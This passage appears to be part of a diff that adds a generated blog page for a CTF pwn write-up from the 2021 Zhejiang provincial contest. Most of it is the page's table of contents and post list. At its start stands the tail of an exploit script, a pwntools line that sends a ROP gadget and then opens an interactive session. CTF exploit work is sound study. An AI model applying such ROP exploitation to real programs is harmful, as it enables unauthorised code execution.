class="number">8</span>+p64(pop_rdi_ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/11/06/zjctf2021%20pwn2/">2021浙江省赛pwn2复盘</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2021-11-06, 22:00:00</p>
+        <p><span>最后更新:</span>2021-11-12, 10:56:10</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/11/06/zjctf2021%20pwn2/" title="2021浙江省赛pwn2复盘">http://example.com/2021/11/06/zjctf2021%20pwn2/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/11/06/zjctf2021%20pwn2/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/11/07/de1ctf_2019_weapon/">
+                    de1ctf_2019_weapon writeup
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/11/04/wdb2018_guess%20writeup/">
+                    wdb2018_guess writeup
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-number">2.</span> <span class="toc-text">泄露地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E7%BD%AErop%E9%93%BE"><span class="toc-number">3.1.</span> <span class="toc-text">布置rop链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81my-read"><span class="toc-number">3.2.</span> <span class="toc-text">劫持my_read</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"2021浙江省赛pwn2复盘　| xia0ji233's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/11/07/de1ctf_2019_weapon/" title="上一篇: de1ctf_2019_weapon writeup">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/11/04/wdb2018_guess%20writeup/" title="下一篇: wdb2018_guess writeup">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/11/07/de1ctf_2019_weapon/">de1ctf_2019_weapon writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/06/zjctf2021%20pwn2/">2021浙江省赛pwn2复盘</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/04/wdb2018_guess%20writeup/">wdb2018_guess writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/">网鼎杯2020青龙组singal writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/02/WUSTCTF2020%20level4%20writeup/">WUSTCTF2020 level4 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/01/ciscn2019_final_3%20writeup/">ciscn2019_final_3 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/">关于C++文件换libc版本的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/31/zjctf2021%20%E5%86%B3%E8%B5%9B/">2021浙江省决赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/27/lctf2016_pwn200%20writeup/">lctf2016_pwn200 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/">2021江西省赛RSA writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/">2020浙江省赛 pwn2 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/26/gyctf_2020_document/">gyctf_2020_document write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/">2021浙江省预赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/15/babyfengshui_33c3_2016%20writeup/">babyfengshui_33c3_2016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/19/ret2dl_resolve/">ret2dl_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/">浙江2020省赛pwn1</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">SROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/">2021华东南赛区国赛线下赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/08/axb_2019_fmt32%20wp/">axb_2019_fmt32 wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/">格式化字符串漏洞利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/cachelab/">cachelab实验报告:模拟cache的功能</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">动态调试工具的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/">系统调用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/">ret2libc实战</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">archlab实验报告：y86命令使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/08/RSA/">RSA解密</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/06/%E7%BA%A2%E5%B8%BD%E6%9D%AF2019%20Easyre%20wp/">红帽杯2019 easyRe</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/01/ret2libc%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">ret2libc学习报告</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/">canary保护学习报告:通过字符串泄露canary</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/30/buflab/">bufblab实验报告:32位程序缓冲区溢出攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/attqacklab/">attacklab实验报告:代码注入以及rop攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/19/bomblab/">bomblab实验报告:二进制安全与逆向分析</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2021 xia0ji233
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
